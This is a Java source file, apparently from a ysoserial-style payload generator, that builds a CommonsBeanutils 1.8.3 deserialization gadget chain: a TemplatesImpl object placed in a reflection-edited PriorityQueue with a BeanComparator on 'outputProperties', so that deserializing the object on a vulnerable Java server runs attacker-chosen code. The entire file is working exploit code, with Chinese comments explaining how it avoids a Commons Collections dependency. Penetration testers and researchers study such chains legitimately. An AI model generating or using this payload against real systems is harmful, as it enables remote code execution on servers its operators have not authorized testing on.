package com.mechoy.gadget;

import com.mechoy.bean.YsoGadgetBean;
import com.mechoy.gadget.inter.Gadget;
import com.mechoy.utils.CBBeanUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
//import org.apache.commons.beanutils.BeanComparator;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CB183 extends Gadget {
    @Override
    public Object getObject(YsoGadgetBean gadgetBean) throws Exception {
        // 第一次执行时需要进行修改
//        if (CBFlag) {
//            ClassPool classPool = ClassPool.getDefault();
//            classPool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
//            String clsName = "org.apache.commons.beanutils.BeanComparator";
//            CtClass ctClass = classPool.get(clsName);
//            CtField field = CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctClass);
//            ctClass.addField(field);
//            ctClass.toClass();
//            // 释放对象
//            ctClass.detach();
//            CBFlag = false;
//        }
//
//        // 再使用反射检查其值是否正确
//        Field serialVersionUIDField = BeanComparator.class.getDeclaredField("serialVersionUID");
//        serialVersionUIDField.setAccessible(true);
//        long serialVersionUID = (long) serialVersionUIDField.get(null);
//        if (!(serialVersionUID == -3490850999041592962L)) {
//            serialVersionUIDField.set(null, -3490850999041592962L);
//        }
//
//        PriorityQueue priorityQueue = (PriorityQueue) new CB192().getObject(gadgetBean);
//
//        return priorityQueue;

        TemplatesImpl template = null;
        template = super.generateTemplate(gadgetBean);

        // 创建序列化对象
        Class c = Class.forName("java.lang.String$CaseInsensitiveComparator");
        Constructor constructor = c.getDeclaredConstructor();
        constructor.setAccessible(true);
        Comparator comparator = (Comparator<?>) constructor.newInstance();
        //只传入字符串构造方法，方法内部会调用ComparableComparator.getInstance()，而ComparableComparator为CC包中的类，可传入一个JDK原生的Comparator实现类,使其不在使用ComparableComparator


        Comparator beanComparator = (Comparator) CBBeanUtils.getBeanComparatorInstance(true, "outputProperties", comparator);
        PriorityQueue priorityQueue = new PriorityQueue(beanComparator);

        //设置queue
        Field queue = priorityQueue.getClass().getDeclaredField("queue");
        queue.setAccessible(true);
        Object[] o = (Object[]) queue.get(priorityQueue);
        o[0] = template;
        o[1] = "asdf";

        //设置size
        Field size = priorityQueue.getClass().getDeclaredField("size");
        size.setAccessible(true);
        size.set(priorityQueue, 2);
        return priorityQueue;

    }
}
